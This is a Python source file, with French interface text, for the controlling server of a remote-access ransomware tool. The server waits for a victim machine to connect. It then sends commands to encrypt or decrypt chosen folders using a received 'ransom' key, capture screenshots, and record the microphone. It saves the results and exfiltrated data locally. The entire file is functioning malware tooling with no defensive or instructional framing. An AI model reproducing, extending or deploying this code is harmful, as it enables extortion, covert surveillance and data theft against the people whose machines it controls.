import socket
import os
from datetime import datetime

HOST = "0.0.0.0"
PORT = 5001
CAPTURE_DIR = "captures"
EXFIL_DIR = "donnees_windows"
AUDIO_DIR = "audio_captures"
KEY_FILE = "ransom_key_received.key"

def save_key(data):
    with open(KEY_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Clé reçue et enregistrée dans {KEY_FILE}")

def list_captures():
    files = os.listdir(CAPTURE_DIR) if os.path.exists(CAPTURE_DIR) else []
    if files:
        print("[+] Captures :")
        for f in files:
            print(" -", f)
    else:
        print("[!] Aucune capture.")

def list_audio_files():
    files = os.listdir(AUDIO_DIR) if os.path.exists(AUDIO_DIR) else []
    if files:
        print("[+] Fichiers audio reçus :")
        for f in files:
            print(" -", f)
    else:
        print("[!] Aucun fichier audio reçu.")

def receive_audio(conn):
    header = conn.recv(128)
    decoded = header.decode(errors="ignore")

    if header.startswith(b"voice:"):
        print(f"[DEBUG] Header reçu : {decoded}")
        parts = decoded.split(":")
        if len(parts) >= 3:
            filename = parts[1]
            filesize = int(parts[2])
            save_path = os.path.abspath(os.path.join(AUDIO_DIR, filename))
            print(f"[DEBUG] Sauvegarde du fichier audio dans : {save_path}")

            with open(save_path, "wb") as f:
                received = 0
                while received < filesize:
                    chunk = conn.recv(min(4096, filesize - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            print(f"[+] Fichier audio reçu et sauvegardé ici : {save_path}")
        else:
            print("[!] Erreur de format de header pour voice:")
    else:
        print("[!] Aucun header voice reçu.")

def receive_file(conn, dest_dir, prefix):
    header = conn.recv(128)
    decoded = header.decode(errors="ignore")
    if header.startswith(prefix.encode()):
        parts = decoded.split(":")
        if len(parts) > 3:
            filename = parts[1]
            filesize = int(parts[2])
            os.makedirs(dest_dir, exist_ok=True)
            save_path = os.path.join(dest_dir, filename)
            with open(save_path, "wb") as f:
                received = 0
                while received < filesize:
                    chunk = conn.recv(min(4096, filesize - received))
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)
            print(f"[+] Fichier reçu : {save_path}")
        else:
            print(f"[!] Erreur dans le header {prefix}")
    else:
        print(f"[!] Header inattendu (pas {prefix}) : {decoded}")

def start_server():
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    os.makedirs(EXFIL_DIR, exist_ok=True)
    os.makedirs(AUDIO_DIR, exist_ok=True)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[+] Serveur en écoute sur {HOST}:{PORT}")
        conn, addr = server.accept()
        print(f"[+] Connexion établie avec {addr}")

        while True:
            print("\n[ Menu ]")
            print("1 - Lister les dossiers et chiffrer un dossier")
            print("2 - Lister et déchiffrer un dossier")
            print("3 - Capture d’écran")
            print("4 - Afficher les captures")
            print("5 - Enregistrer audio depuis le micro")
            print("6 - Quitter")
            print("7 - Afficher les fichiers audio reçus")

            choice = input("Choix : ")

            if choice == "1":
                conn.sendall(b"listdirs")
                print("[+] Listing des dossiers…")
                data = conn.recv(8192).decode()
                print(data)
                selected = input("Dossier à chiffrer : ").strip()
                conn.sendall(f"encrypt:{selected}".encode())
                print(conn.recv(1024).decode())

            elif choice == "2":
                conn.sendall(b"key_request")
                print("[+] Requête de clé…")
                while True:
                    response = conn.recv(8192)
                    if not response.startswith(b"key:"):
                        break
                    save_key(response[4:])
                print(response.decode())
                selected = input("Dossier à déchiffrer : ").strip()
                conn.sendall(f"decrypt:{selected}".encode())
                print(conn.recv(1024).decode())

            elif choice == "3":
                conn.sendall(b"screenshot")
                size_data = conn.recv(16)
                total_size = int(size_data.decode().strip())
                received_data = b""
                while len(received_data) < total_size:
                    received_data += conn.recv(4096)
                filename = f"{CAPTURE_DIR}/capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                with open(filename, "wb") as f:
                    f.write(received_data)
                print(f"[+] Capture sauvegardée : {filename}")

            elif choice == "4":
                list_captures()

            elif choice == "5":
                conn.sendall(b"voice")
                print("[+] Enregistrement vocal déclenché.")
                receive_audio(conn)

            elif choice == "6":
                conn.sendall(b"exit")
                print("[+] Fermeture du serveur.")
                break

            elif choice == "7":
                list_audio_files()

if __name__ == "__main__":
    start_server()
